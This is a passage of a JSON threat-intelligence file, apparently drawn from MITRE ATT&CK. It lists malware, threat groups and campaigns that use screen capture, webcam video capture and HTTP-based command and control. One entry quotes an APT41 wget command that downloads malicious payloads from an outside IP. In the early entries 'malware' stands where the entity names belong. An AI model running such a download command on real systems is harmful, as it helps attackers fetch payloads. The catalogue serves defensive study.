                "Description": "malware is capable of capturing screenshots on Windows and macOS systems.[60]"
            },
            "S0152": {
                "ID": "S0152",
                "Name": "EvilGrab",
                "Description": "malware has the capability to capture screenshots.[61]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware captured screenshots and desktop video recordings.[62]"
            },
            "S0182": {
                "ID": "S0182",
                "Name": "FinFisher",
                "Description": "malware takes a screenshot of the screen and displays it on top of all other windows for few seconds in an apparent attempt to hide some messages showed by the system during the setup process.[63][64]"
            },
            "S0143": {
                "ID": "S0143",
                "Name": "Flame",
                "Description": "malware can take regular screenshots when certain applications are open that are sent to the command and control server.[65]"
            },
            "S0381": {
                "ID": "S0381",
                "Name": "FlawedAmmyy",
                "Description": "malware can capture screenshots.[66]"
            },
            "S0277": {
                "ID": "S0277",
                "Name": "FruitFly",
                "Description": "malware takes screenshots of the user's desktop.[67]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "The malware ScreenCap component can take screenshots on a compromised host.[68]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware's malware can take screenshots of the compromised computer every minute.[69]"
            },
            "S0032": {
                "ID": "S0032",
                "Name": "gh0st RAT",
                "Description": "malware can capture the victim\u2019s screen remotely.[70]"
            },
            "G0115": {
                "ID": "G0115",
                "Name": "GOLD SOUTHFIELD",
                "Description": "malware has used the remote monitoring and management tool ConnectWise to obtain screen captures from victim's machines.[71]"
            },
            "S0417": {
                "ID": "S0417",
                "Name": "GRIFFON",
                "Description": "malware has used a screenshot module that can be used to take a screenshot of the remote system.[72]"
            },
            "G0043": {
                "ID": "G0043",
                "Name": "Group5",
                "Description": "Malware used by malware is capable of watching the victim's screen.[73]"
            },
            "S0151": {
                "ID": "S0151",
                "Name": "HALFBAKED",
                "Description": "malware can obtain screenshots from the victim.[74]"
            },
            "S0431": {
                "ID": "S0431",
                "Name": "HotCroissant",
                "Description": "malware has the ability to do real time screen viewing on an infected host.[75]"
            },
            "S0203": {
                "ID": "S0203",
                "Name": "Hydraq",
                "Description": "malware includes a component based on the code of VNC that can stream a live feed of the desktop of an infected host.[76]"
            },
            "S0398": {
                "ID": "S0398",
                "Name": "HyperBro",
                "Description": "malware has the ability to take screenshots.[77]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can capture screenshots of not only the entire screen, but of each separate window open, in case they are overlapping.[78][79]"
            },
            "S0163": {
                "ID": "S0163",
                "Name": "Janicab",
                "Description": "malware captured screenshots and sent them out to a C2 server.[80][81]"
            },
            "S0044": {
                "ID": "S0044",
                "Name": "JHUHUGIT",
                "Description": "A malware variant takes screenshots by simulating the user pressing the \"Take Screenshot\" key (VK_SCREENSHOT), accessing the screenshot saved in the clipboard, and converting it to a JPG image.[82][83]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware has the capability to take screenshots of the victim\u2019s machine.[84][85]"
            },
            "S0088": {
                "ID": "S0088",
                "Name": "Kasidet",
                "Description": "malware has the ability to initiate keylogging and screen captures.[86]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
                "Description": "malware captures screenshots of the victim\u2019s screen.[87]"
            },
            "S0387": {
                "ID": "S0387",
                "Name": "KeyBoy",
                "Description": "malware has a command to perform screen grabbing.[88]"
            },
            "S0271": {
                "ID": "S0271",
                "Name": "KEYMARBLE",
                "Description": "malware can capture screenshots of the victim\u2019s machine.[89]"
            },
            "S0437": {
                "ID": "S0437",
                "Name": "Kivars",
                "Description": "malware has the ability to capture screenshots on the infected host.[90]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "malware can take screenshots of the victim\u2019s machine.[91]"
            },
            "S0680": {
                "ID": "S0680",
                "Name": "LitePower",
                "Description": "malware can take system screenshots and save them to %AppData%.[92]"
            },
            "S0681": {
                "ID": "S0681",
                "Name": "Lizar",
                "Description": "malware can take JPEG screenshots of an infected system.[93][94]"
            },
            "S0582": {
                "ID": "S0582",
                "Name": "LookBack",
                "Description": "malware can take desktop screenshots.[95]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware captures screenshots.[96][97][98][99]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware has used Apple\u2019s Core Graphic APIs, such as CGWindowListCreateImageFromArray, to capture the user's screen and open windows.[100][101]"
            },
            "S0282": {
                "ID": "S0282",
                "Name": "MacSpy",
                "Description": "malware can capture screenshots of the desktop over multiple monitors.[67]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can take a screenshot of the target machine and save it to a file.[102]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware malware can take a screenshot and upload the file to its C2 server.[103]"
            },
            "S0652": {
                "ID": "S0652",
                "Name": "MarkiRAT",
                "Description": "malware can capture screenshots that are initially saved as \u2018scr.jpg\u2019.[104]"
            },
            "S0167": {
                "ID": "S0167",
                "Name": "Matryoshka",
                "Description": "malware is capable of performing screen captures.[105][106]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware can take and save screenshots.[102][107]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware can collect screenshots of the victim\u2019s machine.[108][109]"
            },
            "S0339": {
                "ID": "S0339",
                "Name": "Micropsia",
                "Description": "malware takes screenshots every 90 seconds by calling the Gdi32.BitBlt API.[110]"
            },
            "S1122": {
                "ID": "S1122",
                "Name": "Mispadu",
                "Description": "malware has the ability to capture screenshots on compromised hosts.[111][112][113][114]"
            },
            "G1019": {
                "ID": "G1019",
                "Name": "MoustachedBouncer",
                "Description": "malware has used plugins to take screenshots on targeted systems.[115]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has used malware that can capture screenshots of the victim\u2019s machine.[116]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can capture the victim's screen.[117][118][119][120]"
            },
            "S1090": {
                "ID": "S1090",
                "Name": "NightClub",
                "Description": "malware can load a module to call CreateCompatibleDC and GdipSaveImageToStream for screen capture.[115]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware can capture screenshots of the victim\u2019s machines.[121]"
            },
            "S1107": {
                "ID": "S1107",
                "Name": "NKAbuse",
                "Description": "malware can take screenshots of the victim machine.[122]"
            },
            "S0644": {
                "ID": "S0644",
                "Name": "ObliqueRAT",
                "Description": "malware can capture a screenshot of the current screen.[123]"
            },
            "S0340": {
                "ID": "S0340",
                "Name": "Octopus",
                "Description": "malware can capture screenshots of the victims\u2019 machine.[124][125][126]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has a tool called CANDYKING to capture a screenshot of user's desktop.[127]"
            },
            "S1050": {
                "ID": "S1050",
                "Name": "PcShare",
                "Description": "malware can take screen shots of a compromised machine.[68]"
            },
            "S0643": {
                "ID": "S0643",
                "Name": "Peppy",
                "Description": "malware can take screenshots on targeted systems.[48]"
            },
            "S0013": {
                "ID": "S0013",
                "Name": "PlugX",
                "Description": "malware allows the operator to capture screenshots.[128]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware has the ability to take screen captures.[129][130]"
            },
            "S0216": {
                "ID": "S0216",
                "Name": "POORAIM",
                "Description": "malware can perform screen capturing.[53]"
            },
            "S0194": {
                "ID": "S0194",
                "Name": "PowerSploit",
                "Description": "malware's Get-TimedScreenshot Exfiltration module can take screenshots at regular intervals.[131][132]"
            },
            "S0223": {
                "ID": "S0223",
                "Name": "POWERSTATS",
                "Description": "malware can retrieve screenshots from compromised hosts.[133][134]"
            },
            "S0184": {
                "ID": "S0184",
                "Name": "POWRUNER",
                "Description": "malware can capture a screenshot from a victim.[135]"
            },
            "S0113": {
                "ID": "S0113",
                "Name": "Prikormka",
                "Description": "malware contains a module that captures screenshots of the victim's desktop.[136]"
            },
            "S0279": {
                "ID": "S0279",
                "Name": "Proton",
                "Description": "malware captures the content of the desktop with the screencapture binary.[67]"
            },
            "S0147": {
                "ID": "S0147",
                "Name": "Pteranodon",
                "Description": "malware can capture screenshots at a configurable interval.[137][138]"
            },
            "S0192": {
                "ID": "S0192",
                "Name": "Pupy",
                "Description": "malware can drop a mouse-logger that will take small screenshots around at each click and then send back to the server.[139]"
            },
            "S0686": {
                "ID": "S0686",
                "Name": "QuietSieve",
                "Description": "malware has taken screenshots every five minutes and saved them to the user's local Application Data folder under Temp\\SymbolSourceSymbols\\icons or Temp\\ModeAuto\\icons.[140]"
            },
            "S0629": {
                "ID": "S0629",
                "Name": "RainyDay",
                "Description": "malware has the ability to capture screenshots.[141]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can take screenshots every 30 seconds as well as when an external removable storage device is connected.[142]"
            },
            "S0662": {
                "ID": "S0662",
                "Name": "RCSession",
                "Description": "malware can capture screenshots from a compromised host.[143]"
            },
            "S0495": {
                "ID": "S0495",
                "Name": "RDAT",
                "Description": "malware can take a screenshot on the infected system.[144]"
            },
            "S0153": {
                "ID": "S0153",
                "Name": "RedLeaves",
                "Description": "malware can capture screenshots.[145][146]"
            },
            "S0332": {
                "ID": "S0332",
                "Name": "Remcos",
                "Description": "malware takes automated screenshots of the infected machine.[147]"
            },
            "S0375": {
                "ID": "S0375",
                "Name": "Remexi",
                "Description": "malware takes screenshots of windows of interest.[148]"
            },
            "S0592": {
                "ID": "S0592",
                "Name": "RemoteUtilities",
                "Description": "malware can take screenshots on a compromised host.[149]"
            },
            "S0379": {
                "ID": "S0379",
                "Name": "Revenge RAT",
                "Description": "malware has a plugin for screen capture.[150]"
            },
            "S0270": {
                "ID": "S0270",
                "Name": "RogueRobin",
                "Description": "malware has a command named $screenshot that may be responsible for taking screenshots of the victim machine.[151]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can capture screenshots of the infected system using the gdi32 library.[152][153][154][155][156]"
            },
            "S0090": {
                "ID": "S0090",
                "Name": "Rover",
                "Description": "malware takes screenshots of the compromised system's desktop and saves them to C:\\system\\screenshot.bmp for exfiltration every 60 minutes.[157]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware can capture screenshots.[158][159]"
            },
            "S0546": {
                "ID": "S0546",
                "Name": "SharpStage",
                "Description": "malware has the ability to capture the victim's screen.[160][161]"
            },
            "S0217": {
                "ID": "S0217",
                "Name": "SHUTTERSPEED",
                "Description": "malware can capture screenshots.[53]"
            },
            "G0091": {
                "ID": "G0091",
                "Name": "Silence",
                "Description": "malware can capture victim screen activity.[162][163]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can take a screenshot of the current desktop.[164]"
            },
            "S0633": {
                "ID": "S0633",
                "Name": "Sliver",
                "Description": "malware can take screenshots of the victim\u2019s active display.[165]"
            },
            "S0533": {
                "ID": "S0533",
                "Name": "SLOTHFULMEDIA",
                "Description": "malware has taken a screenshot of a victim's desktop, named it \"Filter3.jpg\", and stored it in the local directory.[166]"
            },
            "S0649": {
                "ID": "S0649",
                "Name": "SMOKEDHAM",
                "Description": "malware can capture screenshots of the victim\u2019s desktop.[167][168]"
            },
            "S0273": {
                "ID": "S0273",
                "Name": "Socksbot",
                "Description": "malware can take screenshots.[169]"
            },
            "S0380": {
                "ID": "S0380",
                "Name": "StoneDrill",
                "Description": "malware can take screenshots.[170]"
            },
            "S1034": {
                "ID": "S1034",
                "Name": "StrifeWater",
                "Description": "malware has the ability to take screen captures.[171]"
            },
            "S1064": {
                "ID": "S1064",
                "Name": "SVCReady",
                "Description": "malware can take a screenshot from an infected host.[172]"
            },
            "S0663": {
                "ID": "S0663",
                "Name": "SysUpdate",
                "Description": "malware has the ability to capture screenshots.[173]"
            },
            "S0098": {
                "ID": "S0098",
                "Name": "T9000",
                "Description": "malware can take screenshots of the desktop and target application windows, saving them to user directories as one byte XOR encrypted .dat files.[174]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to take screenshots on an infected host including capturing content from windows of instant messaging applications.[175]"
            },
            "S0004": {
                "ID": "S0004",
                "Name": "TinyZBot",
                "Description": "malware contains screen capture functionality.[176]"
            },
            "S0094": {
                "ID": "S0094",
                "Name": "Trojan.Karagany",
                "Description": "malware can take a desktop screenshot and save the file into \\ProgramData\\Mail\\MailAg\\shot.png.[177][178]"
            },
            "S0647": {
                "ID": "S0647",
                "Name": "Turian",
                "Description": "malware has the ability to take screenshots.[179]"
            },
            "S0199": {
                "ID": "S0199",
                "Name": "TURNEDUP",
                "Description": "malware is capable of taking screenshots.[180]"
            },
            "S0275": {
                "ID": "S0275",
                "Name": "UPPERCUT",
                "Description": "malware can capture desktop screenshots in the PNG format and send them to the C2 server.[181]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has used hooked APIs to take screenshots.[182][183]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware has the ability to take screenshots on a compromised host.[184]"
            },
            "S0257": {
                "ID": "S0257",
                "Name": "VERMIN",
                "Description": "malware can perform screen captures of the victim\u2019s machine.[185]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware has the ability to take a screenshot of the infected host desktop using Windows GDI+.[186]"
            },
            "S0161": {
                "ID": "S0161",
                "Name": "XAgentOSX",
                "Description": "malware contains the takeScreenShot (along with startTakeScreenShot and stopTakeScreenShot) functions to take screenshots using the CGGetActiveDisplayList, CGDisplayCreateImage, and NSImage:initWithCGImage methods.[11]"
            },
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware saves a screen capture of the victim's system with a numbered filename and .jpg extension. Screen captures are taken at specified intervals based on the system. [187]"
            },
            "S0248": {
                "ID": "S0248",
                "Name": "yty",
                "Description": "malware collects screenshots of the victim machine.[188]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "A variant of malware captures screenshots of the victim\u2019s machine in JPEG and BMP format.[33][189][190][191][192][193]"
            },
            "S0330": {
                "ID": "S0330",
                "Name": "Zeus Panda",
                "Description": "malware can take screenshots of the victim\u2019s machine.[194]"
            },
            "S0086": {
                "ID": "S0086",
                "Name": "ZLib",
                "Description": "malware has the ability to obtain screenshots of the compromised system.[195]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware can capture screenshots.[196]"
            }
        }
    },
    "T1125": {
        "ttp_name": "Video Capture",
        "ttp_id": "T1125",
        "href": "/techniques/T1125",
        "tactic": "Collection",
        "description": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. [1]",
        "Procedure": {
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware can access the victim\u2019s webcam and record video.[2][3]"
            },
            "S1087": {
                "ID": "S1087",
                "Name": "AsyncRAT",
                "Description": "malware can record screen content on targeted systems.[4]"
            },
            "S0234": {
                "ID": "S0234",
                "Name": "Bandook",
                "Description": "malware has modules that are capable of capturing video from a victim's webcam.[5]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware can record screen content in AVI format.[6][7]"
            },
            "S0338": {
                "ID": "S0338",
                "Name": "Cobian RAT",
                "Description": "malware has a feature to access the webcam on the victim\u2019s machine.[8]"
            },
            "S0591": {
                "ID": "S0591",
                "Name": "ConnectWise",
                "Description": "malware can record video on remote hosts.[9]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware can capture webcam video on targeted systems.[10][11]"
            },
            "S0334": {
                "ID": "S0334",
                "Name": "DarkComet",
                "Description": "malware can access the victim\u2019s webcam to take pictures.[12][13]"
            },
            "S0021": {
                "ID": "S0021",
                "Name": "Derusbi",
                "Description": "malware is capable of capturing video.[14]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can capture webcam data on Windows and macOS systems.[15]"
            },
            "S0152": {
                "ID": "S0152",
                "Name": "EvilGrab",
                "Description": "malware has the capability to capture video from a victim machine.[16]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware created a custom video recording capability that could be used to monitor operations in the victim's environment.[17][18]"
            },
            "S0434": {
                "ID": "S0434",
                "Name": "Imminent Monitor",
                "Description": "malware has a remote webcam monitoring capability.[19][20]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can remotely activate the victim\u2019s webcam to capture content.[21][22]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware has the capability to capture video from a webcam.[23][24]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
                "Description": "malware captures images from the webcam.[25]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware takes photos from the computer\u2019s web camera.[26][27][28]"
            },
            "S0336": {
                "ID": "S0336",
                "Name": "NanoCore",
                "Description": "malware can access the victim's webcam and capture data.[29][30]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware can access the victim's webcam.[31][32]"
            },
            "S0644": {
                "ID": "S0644",
                "Name": "ObliqueRAT",
                "Description": "malware can capture images from webcams on compromised hosts.[33]"
            },
            "S1050": {
                "ID": "S1050",
                "Name": "PcShare",
                "Description": "malware can capture camera video as part of its collection process.[34]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware has used a Python tool named Bewmac to record the webcam on compromised hosts.[35]"
            },
            "S0192": {
                "ID": "S0192",
                "Name": "Pupy",
                "Description": "malware can access a connected webcam and capture pictures.[36]"
            },
            "S0262": {
                "ID": "S0262",
                "Name": "QuasarRAT",
                "Description": "malware can perform webcam viewing.[37][38]"
            },
            "S0332": {
                "ID": "S0332",
                "Name": "Remcos",
                "Description": "malware can access a system\u2019s webcam and take pictures.[39]"
            },
            "S0379": {
                "ID": "S0379",
                "Name": "Revenge RAT",
                "Description": "malware has the ability to access the webcam.[40][41]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware has the ability to record video on a compromised host.[42][43]"
            },
            "G0091": {
                "ID": "G0091",
                "Name": "Silence",
                "Description": "malware has been observed making videos of victims to observe bank employees day to day activities.[44][45]"
            },
            "S0098": {
                "ID": "S0098",
                "Name": "T9000",
                "Description": "malware uses the Skype API to record audio and video calls. It writes encrypted data to %APPDATA%\\Intel\\Skype.[46]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to capture webcam video.[47]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware can access the webcam on a victim's machine.[48][49]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware has a command to perform video device spying.[50]"
            }
        }
    },
    "T1071": {
        "ttp_name": "Application Layer Protocol",
        "ttp_id": "T1071",
        "href": "/techniques/T1071",
        "subtechnique": {
            "001": {
                "name": "Web Protocols",
                "href": "/techniques/T1071/001",
                "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as HTTP/S[1] and WebSocket[2] that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
                "Procedure": {
                    "C0028": {
                        "ID": "C0028",
                        "Name": "2015 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team used BlackEnergy to communicate between compromised hosts and their command-and-control servers via HTTP post requests. [3]"
                    },
                    "S0066": {
                        "ID": "S0066",
                        "Name": "3PARA RAT",
                        "Description": "<name> uses HTTP for command and control.[1]"
                    },
                    "S0065": {
                        "ID": "S0065",
                        "Name": "4H RAT",
                        "Description": "<name> uses HTTP for command and control.[1]"
                    },
                    "S0469": {
                        "ID": "S0469",
                        "Name": "ABK",
                        "Description": "<name> has the ability to use HTTP in communications with C2.[4]"
                    },
                    "S1028": {
                        "ID": "S1028",
                        "Name": "Action RAT",
                        "Description": "<name> can use HTTP to communicate with C2 servers.[5]"
                    },
                    "S0045": {
                        "ID": "S0045",
                        "Name": "ADVSTORESHELL",
                        "Description": "<name> connects to port 80 of a C2 server using Wininet API. Data is exchanged via HTTP POSTs.[6]"
                    },
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> has used HTTP for C2 communications.[7][8]"
                    },
                    "S1025": {
                        "ID": "S1025",
                        "Name": "Amadey",
                        "Description": "<name> has used HTTP for C2 communications.[9]"
                    },
                    "S0504": {
                        "ID": "S0504",
                        "Name": "Anchor",
                        "Description": "<name> has used HTTP and HTTPS in C2 communications.[10]"
                    },
                    "S1074": {
                        "ID": "S1074",
                        "Name": "ANDROMEDA",
                        "Description": "<name> has the ability to make GET requests to download files from C2.[11]"
                    },
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name> has sent data to its C2 server via POST requests.[12][13]"
                    },
                    "S0622": {
                        "ID": "S0622",
                        "Name": "AppleSeed",
                        "Description": "<name> has the ability to communicate with C2 over HTTP.[14][15]"
                    },
                    "G0026": {
                        "ID": "G0026",
                        "Name": "APT18",
                        "Description": "<name> uses HTTP for C2 communications.[16]"
                    },
                    "G0073": {
                        "ID": "G0073",
                        "Name": "APT19",
                        "Description": "<name> used HTTP for C2 communications. <name> also used an HTTP malware variant to communicate over HTTP for C2.[17][18]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "Later implants used by <name>, such as CHOPSTICK, use a blend of HTTP, HTTPS, and other legitimate channels for C2, depending on module configuration.[19][20]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks. The group has also used downloaded encrypted payloads over HTTP.[21][22]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used HTTP for command and control.[23]"
                    },
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name> uses HTTPS to conceal C2 communications.[24]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> used a backdoor, QUICKRIDE, to communicate to the C2 server over HTTP and HTTPS.[25]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used HTTP in communications with C2.[26][27]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits.[28]"
                    },
                    "S0456": {
                        "ID": "S0456",
                        "Name": "Aria-body",
                        "Description": "<name> has used HTTP in C2 communications.[29]"
                    },
                    "S1029": {
                        "ID": "S1029",
                        "Name": "AuTo Stealer",
                        "Description": "<name> can use HTTP to communicate with its C2 servers.[5]"
                    },
                    "S0473": {
                        "ID": "S0473",
                        "Name": "Avenger",
                        "Description": "<name> has the ability to use HTTP in communication with C2.[4]"
                    },
                    "S0475": {
                        "ID": "S0475",
                        "Name": "BackConfig",
                        "Description": "<name> has the ability to use HTTPS for C2 communiations.[30]"
                    },
                    "S0031": {
                        "ID": "S0031",
                        "Name": "BACKSPACE",
                        "Description": "<name> uses HTTP as a transport to communicate with its command server.[31]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> can use HTTP and HTTPS over port 443 to communicate with actor-controlled C2 servers.[32][33]"
                    },
                    "S0128": {
                        "ID": "S0128",
                        "Name": "BADNEWS",
                        "Description": "<name> establishes a backdoor over HTTP.[34]"
                    },
                    "S0337": {
                        "ID": "S0337",
                        "Name": "BadPatch",
                        "Description": "<name> uses HTTP for C2.[35]"
                    },
                    "S0239": {
                        "ID": "S0239",
                        "Name": "Bankshot",
                        "Description": "<name> uses HTTP for command and control communication.[36]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can use HTTP and HTTPS over ports 80 and 443 in C2 communications.[37][38][39]"
                    },
                    "S0470": {
                        "ID": "S0470",
                        "Name": "BBK",
                        "Description": "<name> has the ability to use HTTP in communications with C2.[4]"
                    },
                    "S0127": {
                        "ID": "S0127",
                        "Name": "BBSRAT",
                        "Description": "<name> uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.[40]"
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name> has used HTTP for C2 communications.[41][42]"
                    },
                    "G1002": {
                        "ID": "G1002",
                        "Name": "BITTER",
                        "Description": "<name> has used HTTP POST requests for C2.[43][44]"
                    },
                    "S0089": {
                        "ID": "S0089",
                        "Name": "BlackEnergy",
                        "Description": "<name> communicates with its C2 server over HTTP.[45]"
                    },
                    "S0564": {
                        "ID": "S0564",
                        "Name": "BlackMould",
                        "Description": "<name> can send commands to C2 in the body of HTTP POST requests.[46]"
                    },
                    "S0520": {
                        "ID": "S0520",
                        "Name": "BLINDINGCAN",
                        "Description": "<name> has used HTTPS over port 443 for command and control.[47]"
                    },
                    "S0657": {
                        "ID": "S0657",
                        "Name": "BLUELIGHT",
                        "Description": "<name> can use HTTP/S for C2 using the Microsoft Graph API.[48]"
                    },
                    "S0635": {
                        "ID": "S0635",
                        "Name": "BoomBox",
                        "Description": "<name> has used HTTP POST requests for C2.[49]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> malware has used HTTP for C2.[50]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> can use HTTPS and HTTPS for C2 communication.[51][52]"
                    },
                    "S0043": {
                        "ID": "S0043",
                        "Name": "BUBBLEWRAP",
                        "Description": "<name> can communicate using HTTP or HTTPS.[53]"
                    },
                    "S0482": {
                        "ID": "S0482",
                        "Name": "Bundlore",
                        "Description": "<name> uses HTTP requests for C2.[54]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "During <name>, APT41 ran wget http://103.224.80[.]44:8080/kernel to download malicious payloads.[55]"
                    },
                    "C0018": {
                        "ID": "C0018",
                        "Name": "C0018",
                        "Description": "During <name>, the threat actors used HTTP for C2 communications.[56]"
                    },
                    "C0021": {
                        "ID": "C0021",
                        "Name": "C0021",
                        "Description": "During <name>, the threat actors used HTTP for some of their C2 communications.[57]"
                    },
                    "S0030": {
                        "ID": "S0030",
                        "Name": "Carbanak",
                        "Description": "The <name> malware communicates to its command server using HTTP with an encrypted payload.[58]"
                    },
                    "S0484": {
                        "ID": "S0484",
                        "Name": "Carberp",
                        "Description": "<name> has connected to C2 servers via HTTP.[59]"
                    },
                    "S0335": {
                        "ID": "S0335",
                        "Name": "Carbon",
                        "Description": "<name> can use HTTP in C2 communications.[60]"
                    },
                    "S0348": {
                        "ID": "S0348",
                        "Name": "Cardinal RAT",
                        "Description": "<name> is downloaded using HTTP over port 443.[61]"
                    },
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "<name> has used HTTP for C2 communications.[62]"
                    },
                    "S0674": {
                        "ID": "S0674",
                        "Name": "CharmPower",
                        "Description": "<name> can use HTTP to communicate with C2.[63]"
                    },
                    "S0144": {
                        "ID": "S0144",
                        "Name": "ChChes",
                        "Description": "<name> communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.[64][65]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used HTTPS for C2 communications.[66]"
                    },
                    "S0020": {
                        "ID": "S0020",
                        "Name": "China Chopper",
                        "Description": "<name>'s server component executes code sent via HTTP POST commands.[67]"
                    },
                    "S0023": {
                        "ID": "S0023",
                        "Name": "CHOPSTICK",
                        "Description": "Various implementations of <name> communicate with C2 over HTTP.[68]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> has the ability to communicate over HTTP.[69]"
                    },
                    "S0054": {
                        "ID": "S0054",
                        "Name": "CloudDuke",
                        "Description": "One variant of <name> uses HTTP and HTTPS for C2.[70]"
                    },
                    "S1105": {
                        "ID": "S1105",
                        "Name": "COATHANGER",
                        "Description": "<name> uses an HTTP GET request to initialize a follow-on TLS tunnel for command and control.[71]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has used HTTPS for C2.[72][73][74]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use a custom command and control protocol that can be encapsulated in HTTP or HTTPS. All protocols use their standard assigned ports.[75][76][77][78][79]"
                    },
                    "S0244": {
                        "ID": "S0244",
                        "Name": "Comnie",
                        "Description": "<name> uses HTTP for C2 communication.[80]"
                    },
                    "S0126": {
                        "ID": "S0126",
                        "Name": "ComRAT",
